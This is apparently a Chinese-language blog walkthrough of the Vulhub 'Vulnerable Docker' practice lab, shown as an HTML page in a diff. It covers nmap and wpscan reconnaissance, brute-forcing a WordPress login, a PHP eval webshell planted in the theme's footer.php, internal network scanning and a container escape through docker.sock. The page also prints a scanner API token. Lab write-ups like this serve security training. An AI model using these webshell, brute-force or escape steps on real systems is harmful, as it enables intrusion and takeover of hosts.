@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Vulhub Vulnerable Docker 靶场 | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Vulhub Vulnerable Docker 靶场 - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubvulnerabledocker/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubvulnerabledocker/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Vulhub Vulnerable Docker 靶场
+    </h1>
+    <div class="post-meta"><span title='2025-10-25 00:00:00 +0000 UTC'>October 25, 2025</span>
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>靶机ip: 61.139.2.142</p>
+<p>nmap全端口扫描：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>nmap -p- 61.139.2.142 --min-rate=10000
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-25 22:31 CST
+</span></span><span style="display:flex;"><span>Nmap scan report for 61.139.2.142
+</span></span><span style="display:flex;"><span>Host is up (0.00075s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65533 closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
+</span></span></code></pre></div><p>存在22端口的 ssh 服务和8000端口的 wordpress 框架的web服务，wpscan：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>wpscan --url http://61.139.2.142:8000/ --api-token IEMpNIjGQXaJnkgB2X6YREjqcWO5Uq2979maC9WAvi8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress version 4.8.1 identified <span style="color:#f92672">(</span>Insecure, released on 2017-08-02<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span> | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  - http://61.139.2.142:8000/feed/, &lt;generator&gt;https://wordpress.org/?v<span style="color:#f92672">=</span>4.8.1&lt;/generator&gt;
+</span></span><span style="display:flex;"><span> |  - http://61.139.2.142:8000/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span style="color:#f92672">=</span>4.8.1&lt;/generator&gt;
+</span></span><span style="display:flex;"><span> |
+</span></span><span style="display:flex;"><span> | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">89</span> vulnerabilities identified:
+</span></span></code></pre></div><p>有89个漏洞，但是没找到合适的，试试枚举用户：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>wpscan --url http://61.139.2.142:8000/ -e u
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bob
+</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://61.139.2.142:8000/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>直接爆破bob用户试试：</p>
+<pre tabindex="0"><code>wpscan --url http://61.139.2.142:8000/ -U username.txt -P rockyou.txt 
+
+[!] Valid Combinations Found:
+ | Username: bob, Password: Welcome1
+</code></pre><p>登录后台可以在 posts 找到 flag_1：</p>
+<pre tabindex="0"><code>2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998
+
+good job finding this one. Now Lets hunt for the other flags
+
+hint: they are in files.
+</code></pre><p>本来想改plugins的，但是直接访问<code>/wp-content/plugins</code>会报forbidden，后面考虑修改theme，本题环境用的是Twenty Seventeen的主题，直接改里面的footer.php，开头加上一句话木马:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_REQUEST[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * The template for displaying the footer
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Contains the closing of the #content div and all content after.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @package WordPress
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @subpackage Twenty_Seventeen
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @since 1.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @version 1.2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>蚁剑连webshell：http://127.0.0.1:8085/wp-content/themes/twentyseventeen/footer.php，用户为 www-data</p>
+<p>根目录下存在<code>.dockerenv</code>，同时<code>/porc/1/cgroup</code>以及 hostname 都存在明显docker特征：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /proc/1/cgroup
+</span></span><span style="display:flex;"><span>11:name<span style="color:#f92672">=</span>systemd:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>10:hugetlb:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>9:perf_event:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>8:blkio:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>7:freezer:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>6:devices:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>5:memory:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>4:cpuacct:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>3:cpu:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>2:cpuset:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>8f4bca8ef241
+</span></span></code></pre></div><p>但是这个容器里没有docker逃逸的条件，先查一下ip：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ip addr
+</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default 
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>9: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP group default 
+</span></span><span style="display:flex;"><span>    link/ether 02:42:ac:12:00:04 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.18.0.4/16 scope global eth0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>蚁剑传fscan运行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./fscan -h 172.18.0.0/24
+</span></span><span style="display:flex;"><span>cat result.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>172.18.0.4:3306 open
+</span></span><span style="display:flex;"><span>172.18.0.3:80 open
+</span></span><span style="display:flex;"><span>172.18.0.2:22 open
+</span></span><span style="display:flex;"><span>172.18.0.1:22 open
+</span></span><span style="display:flex;"><span>172.18.0.1:8000 open
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.18.0.1:8000    code:200 len:71264  title:NotSoEasy Docker &amp;<span style="color:#75715e">#8211; Just another WordPress site</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.18.0.3         code:200 len:71044  title:NotSoEasy Docker &amp;<span style="color:#75715e">#8211; Just another WordPress site</span>
+</span></span></code></pre></div><p>172.18.0.1 是容器 172.18.0.3 的网关，172.18.0.4:3306 是 wordpress 的数据库服务</p>
+<p>wp-config.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** The name of the database for WordPress */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL database username */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL database password */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;WordPressISBest&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL hostname */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;db:3306&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** Database Charset to use in creating database tables. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_CHARSET&#39;</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_COLLATE&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+</span></span></code></pre></div><p>可以连上mysql服务器，但是没找到什么有用的信息，再扫一下 172.18.0.2 全端口：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./fscan -h 172.18.0.2 -p 1-65535
+</span></span><span style="display:flex;"><span>172.18.0.2:22 open
+</span></span><span style="display:flex;"><span>172.18.0.2:8022 open
+</span></span></code></pre></div><p>proxyfier配置好代理可以直接访问8022端口的web服务，权限为root的一个 docker ssh：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>find / -name docker.sock
+</span></span><span style="display:flex;"><span>/run/docker.sock
+</span></span></code></pre></div><p>容器内安装docker，需要换源，后续利用docker.sock挂载主机根目录到 tmp 目录下即可找到flag_3：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run -it --rm -v /:/tmp/1 wordpress /bin/bash
+</span></span></code></pre></div><p>参考资料：</p>
+<p><a href="https://cloud.tencent.com/developer/news/378799">https://cloud.tencent.com/developer/news/378799</a></p>
+<p><a href="https://strcpy.me/index.php/archives/775/">https://strcpy.me/index.php/archives/775/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
